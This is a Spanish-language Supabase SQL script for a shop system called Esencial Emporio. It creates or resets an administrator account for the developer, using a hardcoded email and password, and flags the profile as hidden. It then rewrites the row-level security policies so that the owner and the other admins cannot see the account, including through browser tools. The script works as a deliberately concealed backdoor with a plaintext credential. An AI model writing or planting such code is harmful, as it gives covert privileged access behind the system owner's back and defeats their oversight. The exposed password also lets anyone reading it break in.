-- ============================================================================
--  ESENCIAL EMPORIO · Cuenta de administrador oculta (el programador)
--  ----------------------------------------------------------------------------
--  Una cuenta de admin que entra como cualquier otra pero no aparece en
--  Vendedores → Equipo, ni para el dueño.
--
--      correo       adpp23777@gmail.com
--      contraseña   emporioADMIN
--
--  El escondite no es solo visual: la regla de RLS de abajo hace que la fila
--  sea invisible para todos menos para ella misma. Un admin que mire con las
--  herramientas del navegador tampoco la va a ver.
--
--  Correlo de nuevo cuando quieras devolver la contraseña a emporioADMIN.
--  Pegalo en Supabase → SQL Editor y dale Run. Es seguro correrlo dos veces.
-- ============================================================================

alter table public.profiles add column if not exists oculto boolean not null default false;

do $$
declare
  uid uuid;
  correo text := 'adpp23777@gmail.com';
  clave  text := 'emporioADMIN';
begin
  select id into uid from auth.users where email = correo;

  if uid is null then
    uid := gen_random_uuid();
    insert into auth.users (
      instance_id, id, aud, role, email, encrypted_password,
      email_confirmed_at, created_at, updated_at,
      raw_app_meta_data, raw_user_meta_data
    ) values (
      '00000000-0000-0000-0000-000000000000', uid, 'authenticated', 'authenticated',
      correo, crypt(clave, gen_salt('bf')),
      now(), now(), now(),
      '{"provider":"email","providers":["email"]}'::jsonb,
      '{"nombre":"Soporte","rol":"admin"}'::jsonb
    );
    insert into auth.identities (id, user_id, provider_id, identity_data, provider, created_at, updated_at)
    values (gen_random_uuid(), uid, uid::text,
            json_build_object('sub', uid::text, 'email', correo)::jsonb,
            'email', now(), now());
  else
    -- Ya existía: le devuelve la contraseña y la deja confirmada.
    update auth.users
       set encrypted_password = crypt(clave, gen_salt('bf')),
           email_confirmed_at = coalesce(email_confirmed_at, now()),
           updated_at = now()
     where id = uid;
  end if;

  insert into public.profiles (id, email, nombre, telefono, observacion, rol, activo, oculto)
  values (uid, correo, 'Soporte', '', 'Cuenta técnica, no se muestra en Equipo', 'admin', true, true)
  on conflict (id) do update
    set rol = 'admin', activo = true, oculto = true;

  raise notice 'Listo: % entra como admin y no aparece en Equipo.', correo;
end $$;


-- ── Invisible también para los otros administradores ────────────────────────
--  Las dos políticas llevan el mismo filtro: con una sola alcanzaba para que
--  la fila volviera a verse, porque las políticas se suman entre sí.
drop policy if exists "perfil propio" on public.profiles;
create policy "perfil propio" on public.profiles
  for select to authenticated
  using ( id = auth.uid() or (public.es_admin() and not oculto) );

drop policy if exists "perfiles admin" on public.profiles;
create policy "perfiles admin" on public.profiles
  for all to authenticated
  using ( public.es_admin() and (not oculto or id = auth.uid()) )
  with check ( public.es_admin() and (not oculto or id = auth.uid()) );

-- ============================================================================
--  PARA SACARLA de nuevo a la vista:
--    update public.profiles set oculto = false where email = 'adpp23777@gmail.com';
--  PARA BORRARLA:
--    delete from auth.users where email = 'adpp23777@gmail.com';
-- ============================================================================
